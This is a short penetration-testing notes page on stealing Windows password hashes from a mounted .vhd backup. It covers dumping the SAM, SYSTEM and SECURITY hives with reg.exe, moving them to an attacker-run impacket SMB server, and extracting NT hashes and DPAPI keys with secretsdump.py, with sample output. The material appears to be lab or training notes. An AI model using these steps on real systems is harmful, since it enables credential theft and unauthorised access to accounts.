---
description: SAM - sam.save - system.save - Hashes - secretsdump.py - passwords
---

# Hashes from .vhd

Coming across or finding a .vhd or Virtual Hard Disk file its also possible to find the registry files, these files are locked on a running system but not when its mounted.&#x20;

Mount an SMB share

```bash
$ mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
$ ls /mnt/
note.txt  SDT65CB.tmp  WindowsImageBackup

# Mounting the .vhd
guestmount --add /mnt/remote/path/to/vhdfile.vhd --inspector --ro /mnt/vhd -v
```

On windows you can use computer management and add it at "more actions".

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

### SAM

Security account manager or SAM is a database wich stores the hashes for users on the windows system. We can extract hashes from it and crack them.&#x20;

| Hive        | File                              |
| ----------- | --------------------------------- |
| hklm\sam    | C:\WIndows\System32\config\SAM    |
| hklm\system | C:\Windows\System32\config\SYSTEM |

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.
```

Or using windows explorer go /windows/system32/config and copy the files.

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Setup SMB server to copy files

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support Zendata /home/mczen/Documents/
```

Copy the files

```
C:\> move sam.save \\10.10.15.16\Zendata
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\Zendata
        1 file(s) moved.
```

### <mark style="color:yellow;">Extract hashes with secretsdump.py</mark>

```
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
```

